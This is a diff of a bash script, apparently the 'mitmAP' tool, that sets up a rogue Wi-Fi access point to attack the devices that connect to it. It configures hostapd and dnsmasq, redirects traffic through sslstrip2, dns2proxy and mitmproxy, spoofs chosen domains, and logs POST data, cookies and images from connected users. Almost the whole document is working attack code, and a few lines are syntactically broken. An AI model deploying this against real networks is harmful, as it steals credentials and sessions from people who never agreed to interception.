@@ -5,117 +5,131 @@ echo $'\n[>] Man in the Middle Access Point'
 
 #-|-------------- Dependencies --------------|-
 
-read -p "[?] Install/Update dependencies? (y/n) " depen_if
+dependencies(){
+	read -p "[?] Install/Update dependencies? (y/n) " depen_if
 	if [ $depen_if == 'y' ]; then
-		echo "[I] Checking/Installing dependencies, please wait..."
-			apt-get -qq -y install dnsmasq mitmproxy hostapd screen wondershaper sslstrip driftnet wireshark python-pcapy &>/dev/null
+		echo -e "[I] Checking/Installing dependencies, please wait..."
+			apt-get -qq -y install dnsmasq mitmproxy hostapd screen wondershaper sslstrip driftnet wireshark python-pcapy python-pip &>/dev/null
 			pip install dnspython pcapy
-		echo "[I] Dependencies installed."
+		echo -e "[I] Dependencies installed."
 	else
-    		echo "[I] Skipping..."
+    		echo -e "[I] Skipping..."
 	fi
+}
 
 #-|----------- Wireless Interface -----------|-
 
-echo "[I] Listing interfaces..."
-	netstat -i | tail -n +3 | awk '{print $1}' | grep -v 'lo' 
-	read -p "[?] Please enter the desired name of your wireless interface (for the AP): " ap_iface
-	read -p "[?] Please enter the name of your internet connected interface: " net_iface
-	# echo this variable with escape characters
-echo "[I] Backing up NetworkManager.cfg..."
-	nmcfg="[main]\nplugins=keyfile\n\n[keyfile]\numanaged-devices=interface-name:"$ap_iface
-	cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup
-echo "[I] Editing NetworkManager.cfg..."
-	echo -e $network_manager_cfg > /etc/NetworkManager/NetworkManager.conf
-echo "[I] Restarting NetworkManager..."
-	service network-manager restart
-echo "[I] Killing wpa_supplicant on "$ap_iface".pid"
-	sudo kill -s SIGQUIT $(cat /var/run/wpa_supplicant."$ap_iface".pid)
-	ifconfig $ap_iface up
+if_setup(){
+	echo -e "[I] Listing interfaces..."
+		netstat -i | tail -n +3 | awk '{print $1}' | grep -v 'lo' 
+		read -p "[?] Please enter the desired name of your wireless interface (for the AP): " ap_iface
+		read -p "[?] Please enter the name of your internet connected interface: " net_iface
+		# echo this variable with escape characters
+	echo -e "[I] Backing up NetworkManager.cfg..."
+			nmcfg="[main]\nplugins=keyfile\n\n[keyfile]\numanaged-devices=interface-name:"$ap_iface
+			cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup
+	echo -e "[I] Editing NetworkManager.cfg..."
+		echo -e $network_manager_cfg > /etc/NetworkManager/NetworkManager.conf
+	echo -e "[I] Restarting NetworkManager..."
+		service network-manager restart
+	echo -e "[I] Killing wpa_supplicant on "$ap_iface
+		wpa_cli -i $ap_iface terminate &>/dev/null
+		ifconfig $ap_iface up
+}
 
 #-|------------- Questionnaire --------------|-
 
 read -p "[?] Use SSLSTRIP 2.0? (y/n) " sslstrip_if
-read -p "[?] Capture unencrypted images with DRIFTNET? (ONLY WORKS W/ GUI) (y/n)" driftnet_if
+read -p "[?] Capture unencrypted images with DRIFTNET? (ONLY WORKS W/ GUI) (y/n) " driftnet_if
 read -p "[?] Set speed limit for the clients? (y/n) " speed_if
 
 #-|----------------- DNSMASQ ----------------|-
 
-echo "[I] Backing up /etc/dnsmasq.conf..."
-	cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
-echo "[I] Creating new /etc/dnsmasq.conf..."
-	if["$sslstrip_if" == "y"]; then
-		# echo this variable with escape characters
-		dnsmasq_file = "port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface="$ap_iface"\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1"
-	else
-		# echo this variable with escape characters
-		dnsmasq_file = "# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface="$ap_iface"\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=10.0.0.1"
-	fi
-echo "[I] Deleting old config file..."
-	rm /etc/dnsmasq.conf > /dev/null 2>&1
-echo "[I] Writing config file..."
-	# This doesnt seem right.
-	echo -e  $dnsmasq_file > /etc/dnsmasq.conf
+dnsmasq(){
+	echo -e "[I] Backing up /etc/dnsmasq.conf..."
+		cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
+	echo -e "[I] Creating new /etc/dnsmasq.conf..."
+		if [ $sslstrip_if == 'y' ]; then
+			# echo this variable with escape characters
+			dnsmasq_file="port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface="$ap_iface"\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1"
+		else
+			# echo this variable with escape characters
+			dnsmasq_file="# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface="$ap_iface"\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=10.0.0.1"
+		fi
+	echo -e "[I] Deleting old config file..."
+		rm /etc/dnsmasq.conf > /dev/null 2>&1
+	echo -e "[I] Writing config file..."
+		# This doesnt seem right.
+		echo -e  $dnsmasq_file > /etc/dnsmasq.conf
+}
 
 #-|----------------- HOSTAPD ----------------|-
 
-read -p "[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf'? (y/n) " hostapd_if
-if ["$hostapd_if" == "y"]; then
-	echo "[I] Listing available SSIDs"
-	iw dev $ap_iface scan | gred SSID | awk '{print $2}'
-	read -p "[?] Please enter the SSID for the AP: " ssid
-	read -p "[?] Please enter the channel for the AP: " channel
-	read -p "[?] Enable WPA2 encryption? (y/n) " wpa_if
-	if ["$wpa_if" == "y"]; then
-		read "[?] Please enter the WPA2 passphrase for the AP: " wpa_passphrase
-		# echo this variable with escape characters
-		hostapd_file_wpa="interface"$ap_iface"\ndriver=nl80211\nssid="$ssid"\nhw_mode=g\nchannel="$channel"\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase="$wpa_passphrase"\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
-		echo "[I] Deleting old config file..."
-			rm /etc/hostapd/hostapd.conf > /dev/null 2>&1
-		echo "[I] Writing config file..."
-			echo -e $hostapd_file_wpa > /etc/hostapd/hostapd.conf
+hostapd(){
+	read -p "[?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf'? (y/n) " hostapd_if
+	if [ $hostapd_if == 'y' ]; then
+		echo -e "[I] Listing available SSIDs"
+			iw dev $ap_iface scan | grep SSID | awk '{print $2}'
+		read -p "[?] Please enter the SSID for the AP: " ssid
+		read -p "[?] Please enter the channel for the AP: " channel
+		read -p "[?] Enable WPA2 encryption? (y/n) " wpa_if
+		if [ $wpa_if == 'y' ]; then
+			read -p "[?] Please enter the WPA2 passphrase for the AP: " wpa_passphrase
+			# echo this variable with escape characters
+			hostapd_file_wpa="interface"$ap_iface"\ndriver=nl80211\nssid="$ssid"\nhw_mode=g\nchannel="$channel"\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase="$wpa_passphrase"\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
+			echo -e "[I] Deleting old config file..."
+				rm /etc/hostapd/hostapd.conf > /dev/null 2>&1
+			echo -e "[I] Writing config file..."
+				echo -e $hostapd_file_wpa > /etc/hostapd/hostapd.conf
+		fi
+	else
+		echo -e "[I] Skipping..."
 	fi
-else
-	echo "[I] Skipping..."
-fi
+}
 
 #-|---------------- AP CONFIG ---------------|-
 
-echo "[I] Configuring AP interface..."
-	ifconfig $ap_iface up 10.0.0.1 netmask 255.255.255.0
-echo "[I] Applying iptables rules..."
-	iptables --delete-chain
-	iptables --table nat --delete-chain
-	iptables --table nat --append POSTROUTING --out-interface $net_iface -j MASQUERADE
-	iptables --append FORWARD --in-interface $ap_iface -j ACCEPT
+ap_setup(){
+	echo -e "[I] Configuring AP interface..."
+		ifconfig $ap_iface up 10.0.0.1 netmask 255.255.255.0
+	echo -e "[I] Applying iptables rules..."
+		iptables --delete-chain
+		iptables --table nat --delete-chain
+		iptables --table nat --append POSTROUTING --out-interface $net_iface -j MASQUERADE
+		iptables --append FORWARD --in-interface $ap_iface -j ACCEPT
+}
 
 #-|-------------- Speed Limit ---------------|-
 
-if ["$speed_if" == "y"]; then
-	read -p "[?] Download speed limit (in KB/s): " speed_down
-	read -p "[?] Upload speed limit (in KB/s): " speed_up
-	echo "[I] Setting speed limit on "$ap_iface"..."
-	wondershaper $ap_iface $speed_up $speed_down
-else
-	echo "[I] Skipping..."
-fi
+speed_setup(){
+	if [ $speed_if == 'y' ]; then
+		read -p "[?] Download speed limit (in KB/s): " speed_down
+		read -p "[?] Upload speed limit (in KB/s): " speed_up
+		echo -e "[I] Setting speed limit on "$ap_iface"..."
+			wondershaper $ap_iface $speed_up $speed_down
+	else
+		echo -e "[I] Skipping..."
+	fi
+}
 
 #-|---------------- WIRESHARK ---------------|-
 
-read -p "[?] Start WIRESHARK on $ap_iface? (ONLY WORKS WITH GUI) (y/n): " wireshark_if
-if ["$wireshark_if" != "y"]; then
-	read -p "[?] Capture packets to .pcap with TSHARK (NO GUI NEEDED) (y/n): " tshark_if
-fi
+wireshark_setup(){
+	read -p "[?] Start WIRESHARK on $ap_iface? (ONLY WORKS WITH GUI) (y/n): " wireshark_if
+	if [ $wireshark_if != 'y' ]; then
+		read -p "[?] Capture packets to .pcap with TSHARK (NO GUI NEEDED) (y/n): " tshark_if
+	fi
+}
 
 #-|-------------- DNS Spoofing  -------------|-
 
 #-|---------------- SSL STRIP ---------------|-
 
-if ["$sslstrip_if" == "y"]; then
+if [ $sslstrip_if == 'y' ]; then
 	read -p "[?] Spoof DNS? (y/n): " ssl_dns_if
-	if ["$ssl_dns_if" == "y"]; then
+	if [ $ssl_dns_if == 'y' ]; then
 		read -p "[?] How many domains do you want to spoof?: " ssl_dns_num
-		echo "[I] Backing up config file..."
+		echo -e "[I] Backing up config file..."
 			cp data/dns2proxy/spoof.cfg data/dns2proxy/spoof.cfg.backup
 			cat /dev/null > data/dns2proxy/spoof.cfg
 	        for ((i=1; i<=$ssl_dns_num; i++)); do
@@ -125,40 +139,39 @@ if ["$sslstrip_if" == "y"]; then
 			echo -e $ssl_dns_line >> data/dns2proxy/spoof.cfg
 		done
 	else
-		echo "[I] Skipping..."
+		echo -e "[I] Skipping..."
 	fi
-	echo "[I] Starting DNSMASQ server..."
-		/etc/init.d/dnsmasq stop > /dev/null 2>&1
-		pkill dnsmasq
-		dnsmasq
+	echo -e "[I] Starting DNSMASQ server..."
+	/etc/init.d/dnsmasq stop > /dev/null 2>&1
+	pkill dnsmasq
+	dnsmasq
 
 	proxy_if = "n"
-	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
 	iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 	iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53
 	sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
 
-	echo "[I] Starting AP on $ap_iface in screen terminal..."
+	echo -e "[I] Starting AP on $ap_iface in screen terminal..."
 		screen -S mitmap-sslstrip -m -d python data/sslstrip2/sslstrip.py -l 9000 -w logs/mitmap-sslstrip.log -a
 		screen -S mitmap-dns2proxy -m -d sh -c 'cd data/dns2proxy && python dns2proxy.py
 		sleep 5s
 		screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
-	if ["$wireshark_if" == "y"]; then
-	               	echo "[I] Starting WIRESHARK..."
-			screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w logs/mitmap-wireshark.pcap
+	if [ $wireshark_if == 'y' ]; then
+		echo -e "[I] Starting WIRESHARK..."
+		screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w logs/mitmap-wireshark.pcap
 	fi
-	if ["$driftnet_if" == "y"]; then
-		echo "[I] Starting DRIFTNET..."
-			screen -S mitmap-driftnet -m -d driftnet -i $ap_iface
+	if [ $driftnet_if == 'y' ]; then
+		echo -e "[I] Starting DRIFTNET..."
+		screen -S mitmap-driftnet -m -d driftnet -i $ap_iface
 	fi
-	if ["$tshark_if" == "y"]; then
-		echo "[I] Starting TSHARK..."
-			screen -S mitmap-tshark -m -d tshark -i $ap_iface -w logs/mitmap-tshark.pcap
+	if [ $tshark_if == 'y' ]; then
+		echo -e "[I] Starting TSHARK..."
+		screen -S mitmap-tshark -m -d tshark -i $ap_iface -w logs/mitmap-tshark.pcap
 	fi
-	echo -e "\nTAIL started on logs/mitmap-sslstrip.log...\nWait for output... (press 'CTRL + C' 2 times to stop)\nHOST-s, POST requests and COOKIES will be shown.\n"
+	echo -e "\nTAIL started on logs/mitmap-sslstrip.log...\nWait for output... \(press 'CTRL + C' 2 times to stop\)\nHOST-s, POST requests and COOKIES will be shown.\n"
 	sleep 5s
-	echo ""
-	echo "[I] Restarting tail in 1 sec... (press 'CTRL + C' again to stop)"
+	echo -e "[I] Restarting tail in 1 sec... \(press 'CTRL + C' again to stop\)"
 		sleep 1s
 		tail -f logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'
 else
@@ -167,9 +180,9 @@ else
 #-|---------- DNSMASQ DNS Spoofing ----------|-
 
 	read -p "[?] Spoof DNS? (y/n): " dns_if
-	if ["$dns_if" == "y"]; then
+	if [ $dns_if == 'y' ]; then
 		read -p "[?] How many domains do you want to spoof?: " dns_num
-                echo "[I] Backing up config file..."
+                echo -e "[I] Backing up config file..."
                         cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
 		for ((i=1; i<=$dns_num; i++)); do
                 	read -p "[?] $i. Domain to spoof (no 'www.'): " dns_domain
@@ -178,9 +191,9 @@ else
 			echo -e $dns_line >> /etc/dnsmasq.conf
 		done
 	else
-		echo "[I] Skipping..."
+		echo -e "[I] Skipping..."
 	fi
-	echo "[I] Starting DNSMASQ server..."
+	echo -e "[I] Starting DNSMASQ server..."
 		/etc/init.d/dnsmasq stop > /dev/null 2>&1
 		pkill dnsmasq
 		dnsmasq
@@ -189,46 +202,46 @@ else
 #-|------------- Traffic Capture ------------|-
 
 	read -p "[?] Capture traffic? (y/n) " proxy_if
-	if ["$proxy_if" == "y"]; then
+	if [ $proxy_if == 'y' ]; then
 		read -p "[?] Capture HTTPS traffic too? (Need to install certificate on device) (y/n) " proxy_config
-		if ["$proxy_config" == "n"]; then
+		if [ $proxy_config == 'n' ]; then
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 		else
-			echo "[I] To install the certificate, go to 'http://mitm.it/' through mitmproxy and choose your OS."
+			echo -e "[I] To install the certificate, go to 'http://mitm.it/' through mitmproxy and choose your OS."
 				iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 				iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
 		fi
 		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
 		echo -e "[I] Starting AP on $ap_iface in screen terminal...\n"
-		if ["$wireshark_if" == "y"]; then
-			echo "[I] Starting WIRESHARK..."
+		if [ $wireshark_if == 'y' ]; then
+			echo -e "[I] Starting WIRESHARK..."
 				screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w logs/mitmap-wireshark.pcap
 		fi
-		if ["$driftnet_if" == "y"]; then
-        	        echo "[I] Starting DRIFTNET..."
+		if [ $driftnet_if == 'y' ]; then
+        	        echo -e "[I] Starting DRIFTNET..."
 	                        screen -S mitmap-driftnet -m -d driftnet -i $ap_iface
         	fi
-		if ["$tshark_if" == "y"]; then
-                	echo "[I] Starting TSHARK..."
+		if [ $tshark_if == 'y' ]; then
+                	echo -e "[I] Starting TSHARK..."
                         	screen -S mitmap-tshark -m -d tshark -i $ap_iface -w logs/mitmap-tsha$
 		fi
 		screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
-		echo -e "[I] Starting MITMPROXY in 5 seconds... (press q and y to exit)\n "
+		echo -e "[I] Starting MITMPROXY in 5 seconds... \(press q and y to exit\)\n "
 			sleep 5
-			echo ""
+			echo -e ""
 			mitmproxy -T -w logs/mitmap-proxy.mitmproxy
 	else
-		echo "[I] Skipping..."
-		if ["$wireshark" == "y"]; then
-			echo "[I] Starting WIRESHARK..."
+		echo -e "[I] Skipping..."
+		if [ $wireshark_if == 'y' ]; then
+			echo -e "[I] Starting WIRESHARK..."
 				screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w logs/mitmap-wireshark.pcap
 		fi
-		if ["$driftnet_if" == "y"]; then
-                        echo "[I] Starting DRIFTNET..."
+		if [ $driftnet_if == 'y' ]; then
+                        echo -e "[I] Starting DRIFTNET..."
                                 screen -S mitmap-driftnet -m -d driftnet -i $ap_iface
                 fi
-                if ["$tshark_if" == "y"]; then
-                        echo "[I] Starting TSHARK..."
+                if [ $tshark_if == 'y' ]; then
+                        echo -e "[I] Starting TSHARK..."
                                 screen -S mitmap-tshark -m -d tshark -i $ap_iface -w logs/mit$
                 fi
 		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
@@ -239,46 +252,48 @@ fi
 
 #-|-------------- Stopping --------------|-
 
-echo ""
-echo "[!] Stopping..."
-if ["$sslstrip_if" == "y" || "$proxy_if" == "y"]; then
-	screen -S mitmap-hostapd -X stuff '^C\n'
-	if ["$sslstrip_if" == "y"]; then
-		screen -S mitmap-sslstrip -X stuff '^C\n'
-		screen -s mitmap-dns2proxy -X stuff '^C\n'
-		if ["ssl_dns_if" == "y"]; then
-			echo "[I] Restoring old data/dns2proxy/spoof.cfg"
-				mv data/dns2proxy/spoof.cfg.backup data/dns2proxy/spoof.cfg
+shutdown(){
+
+	echo -e "[!] Stopping..."
+	if [ $sslstrip_if == 'y' || "$proxy_if" == 'y' ]; then
+		screen -S mitmap-hostapd -X stuff '^C\n'
+		if [ $sslstrip_if == 'y' ]; then
+			screen -S mitmap-sslstrip -X stuff '^C\n'
+			screen -s mitmap-dns2proxy -X stuff '^C\n'
+			if [ $ssl_dns_if == 'y' ]; then
+				echo -e "[I] Restoring old data/dns2proxy/spoof.cfg"
+					mv data/dns2proxy/spoof.cfg.backup data/dns2proxy/spoof.cfg
+			fi
 		fi
 	fi
-fi
-if ["$wireshark_if" == "y"]; then
-	screen -S mitmap-wireshark -X stuff '^C\n'
-fi
-if ["$driftnet_if" == "y"]; then
-	screen -S mitmap-driftnet -X stuff '^C\n'
-fi
-if ["$tshark_if" == "y"]; then
-	screen -S mitmap-tshark -X stuff '^C\n'
-fi
-echo "[I] Restoring old NetworkManager.cfg"
-	mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf
-echo "[I] Restarting NetworkManager..."
-	service network-manager restart
-echo "[I] Stopping DNSMASQ server..."
-	/etc/init.d/dnsmasq stop > /dev/null 2>&1
-	pkill dnsmasq
-echo "[I] Restoring old dnsmasq.cfg..."
-	mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1
-echo "[I] Deleting old dnsmasq.hosts..."
-	rm /etc/dnsmasq.hosts > /dev/null 2>&1
-echo "[I] Removing speed limit from"$ap_iface"..."
-	wondershaper clear $ap_iface > /dev/null 2>&1
-echo "[I] Flushing iptables rules..."
-	iptables --flush
-	iptables --flush -t nat
-	iptables --delete-chain
-	iptables --table nat --delete-chain
-echo "[I] Traffic has been saved to the 'log' folder."
-echo -e "[!] WARNING: If you want to use the AP interface normally, a reboot is required.\n"
-echo "[!] mitmAP module stopped."
+	if [ $wireshark_if == 'y' ]; then
+		screen -S mitmap-wireshark -X stuff '^C\n'
+	fi
+	if [ $driftnet_if == 'y' ]; then
+		screen -S mitmap-driftnet -X stuff '^C\n'
+	fi
+	if [ $tshark_if == 'y' ]; then
+		screen -S mitmap-tshark -X stuff '^C\n'
+	fi
+	echo -e "[I] Restoring old NetworkManager.cfg"
+		mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf
+	echo -e "[I] Restarting NetworkManager..."
+		service network-manager restart
+	echo -e "[I] Stopping DNSMASQ server..."
+		/etc/init.d/dnsmasq stop > /dev/null 2>&1
+		pkill dnsmasq
+	echo -e "[I] Restoring old dnsmasq.cfg..."
+		mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1
+	echo -e "[I] Deleting old dnsmasq.hosts..."
+		rm /etc/dnsmasq.hosts > /dev/null 2>&1
+	echo -e "[I] Removing speed limit from"$ap_iface"..."
+		wondershaper clear $ap_iface > /dev/null 2>&1
+	echo -e "[I] Flushing iptables rules..."
+		iptables --flush
+		iptables --flush -t nat
+		iptables --delete-chain
+		iptables --table nat --delete-chain
+	echo -e "[I] Traffic has been saved to the 'log' folder."
+	echo -e "[!] WARNING: If you want to use the AP interface normally, a reboot is required.\n"
+	echo -e "[!] mitmAP module stopped."
+}
